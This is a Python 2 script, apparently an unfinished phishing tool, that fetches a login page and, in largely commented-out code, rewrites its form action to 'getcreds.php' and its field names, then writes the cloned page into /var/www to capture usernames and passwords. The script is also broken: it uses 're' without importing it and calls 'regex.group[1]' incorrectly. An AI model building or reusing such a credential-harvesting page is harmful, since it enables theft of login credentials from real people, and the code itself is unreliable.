from scapy.all import *
import os
import time
from subprocess import *
from bs4 import BeautifulSoup
import urllib2, httplib, redirecthandle


def get_login_page():
	
	httplib.HTTPConnection.debuglevel=1
	request = urllib2.Request('http://localhost/test.html')
	opener = urllib2.build_opener(redirecthandle.SmartRedirectHandler())
	f = opener.open(request)
	##article = re.sub(r'(?is)</html>.+', '</html>', article)
	redirect = f.url
	##response = urllib2.urlopen('https://google.com')
	html = f.read()
	print "Found the login page here: " + f.url
	########## regex search and replace
	#regex = re.search(r'action="([^"]*)".*?', html)
	#post_action = str(regex.group(0))
	
	print "*" * 20
	print 'modifying the login page...'
	#new_login = html.replace(post_action, 'action=getcreds.php') 
	##### create a login page
	#index_page = open('/var/www/index.html','wb')
	#index_page.write(new_login)
	#index_page.close()
	
	############# MOFIYING THE POST SCRIPT
	
	myhtml = open('/var/www/test.html', 'r')

	read_html = myhtml.read()

	myhtml.close()

	#number = 0

	#html_proc = BeautifulSoup(read_html)

	#inputs =  html_proc.findAll('input')
	
	regex = re.search(r'action="([^"]*)".*?', read_html)
	#post_action = str(regex.group(0))
	print regex.group[1]
	
	#~ for i in inputs:
		#~ print str(number) +": " +str(i)
		#~ number = number + 1
	#~ action = soup.find('form', id='form_product_page').get('action')
	#~ 
	#for i in inputs2:
	#	print i
	#~ print inputs2
	#~ username_select = input('Please choose the username or email ID in numeric representation: ')
		#~ 
	#~ user = str(raw_input('Please enter the username / email of the target script:')).strip()
	#~ password = str(raw_input('Please enter the password of the target script: ')).strip()
	#~ 
	#~ tmp = read_html.replace('name="'+user+'"','name="username"').replace('name="'+password+'"', 'name="password"')
	#~ 
	#~ new_page = open('/var/www/index.html', 'wb')
	#~ new_page.write(tmp)
	#~ new_page.close()
#~ 
	#~ time.sleep(3)

get_login_page()
